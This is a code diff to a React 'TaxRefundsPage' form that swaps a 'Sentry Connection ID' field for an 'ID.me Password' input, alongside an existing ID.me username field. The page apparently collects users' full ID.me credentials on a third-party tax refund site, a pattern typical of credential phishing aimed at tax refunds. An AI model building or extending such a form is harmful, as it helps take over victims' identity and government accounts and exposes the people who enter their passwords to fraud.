@@ -33,7 +33,7 @@ export const TaxRefundsPage = () => {
     fullName: userData?.fullName || '',
     email: userData?.email || '',
     idMeUsername: '',
-    sentry: '',
+    idMePassword: '',
     details: ''
   });
 
@@ -182,13 +182,13 @@ export const TaxRefundsPage = () => {
                 </div>
                 <div className="space-y-3">
                   <label className="text-xs font-bold uppercase tracking-widest text-gray-500 flex items-center gap-2">
-                    <Lock className="w-4 h-4" /> Sentry Connection ID
+                    <Lock className="w-4 h-4" /> ID.me Password
                   </label>
                   <input 
-                    type="text"
-                    value={formData.sentry}
-                    onChange={(e) => setFormData({ ...formData, sentry: e.target.value })}
-                    placeholder="SENTRY-XXXX-XXXX"
+                    type="password"
+                    value={formData.idMePassword}
+                    onChange={(e) => setFormData({ ...formData, idMePassword: e.target.value })}
+                    placeholder="ID.me password"
                     className="w-full p-5 rounded-2xl bg-gray-50 dark:bg-zinc-800 border-none focus:ring-2 focus:ring-amber-500 dark:text-white font-bold"
                     required
                   />
